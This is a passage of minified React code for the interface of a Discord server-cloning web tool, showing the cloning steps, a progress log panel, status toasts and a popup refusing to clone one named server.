                                className: "flex items-start gap-2",
                                children: [e.jsx("span", {
                                    className: "font-bold text-[#5865F2] mt-1",
                                    children: "3."
                                }), "Enter the source server ID (server to clone from)"]
                            }), e.jsxs("p", {
                                className: "flex items-start gap-2",
                                children: [e.jsx("span", {
                                    className: "font-bold text-[#5865F2] mt-1",
                                    children: "4."
                                }), "Enter the target server ID (new server to clone to)"]
                            }), e.jsxs("p", {
                                className: "flex items-start gap-2",
                                children: [e.jsx("span", {
                                    className: "font-bold text-[#5865F2] mt-1",
                                    children: "5."
                                }), 'Click "Clone Server" and wait for the process to complete']
                            })]
                        })]
                    })]
                }), e.jsx("div", {
                    className: "space-y-6",
                    children: e.jsxs("div", {
                        className: "bg-gradient-to-br from-[#1a1a1a] to-[#252525] p-6 rounded-xl border border-[#333333] shadow-xl",
                        children: [e.jsx("h2", {
                            className: "text-xl font-semibold text-gray-100 mb-4",
                            children: "Progress Log"
                        }), e.jsx("div", {
                            id: "progress-container",
                            className: "h-[500px] overflow-y-auto custom-scrollbar bg-[#000000] rounded-lg p-6 font-mono text-sm shadow-inner",
                            children: _.length === 0 ? e.jsxs("div", {
                                className: "text-gray-500 text-center mt-4 flex flex-col items-center gap-4",
                                children: [e.jsx(ve, {
                                    className: "w-8 h-8 opacity-50"
                                }), "Waiting to start cloning..."]
                            }) : _.map( (r, o) => e.jsx("div", {
                                className: "text-green-400 mb-2 animate-terminal-text",
                                children: r
                            }, o))
                        })]
                    })
                })]
            })
        }), $ && e.jsxs("div", {
            className: "fixed bottom-4 right-4 bg-green-500 text-white px-6 py-3 rounded-lg shadow-lg flex items-center gap-2 animate-slide-in",
            children: [e.jsx(xe, {
                className: "w-5 h-5"
            }), "Server cloned successfully!"]
        }), Y && e.jsxs("div", {
            className: "fixed bottom-4 right-4 bg-[#F6C177] text-black px-6 py-3 rounded-lg shadow-lg flex items-center gap-2 animate-slide-in",
            children: [e.jsx(we, {
                className: "w-5 h-5"
            }), "UPI ID copied to clipboard!"]
        }), V && e.jsx("div", {
            className: "fixed inset-0 flex items-center justify-center z-50 bg-black/50 backdrop-blur-sm animate-fade-in",
            children: e.jsxs("div", {
                className: "bg-red-500 text-white px-8 py-6 rounded-xl shadow-2xl animate-bounce-in text-xl font-bold flex items-center gap-3",
                children: [e.jsx(U, {
                    className: "w-6 h-6"
                }), "You Cant Clone Attapadi Brothers Cry About it"]
            })
        })]
    })
}
q(document.getElementById("root")).render(e.jsx(h.StrictMode, {
    children: e.jsx(_e, {})
}));
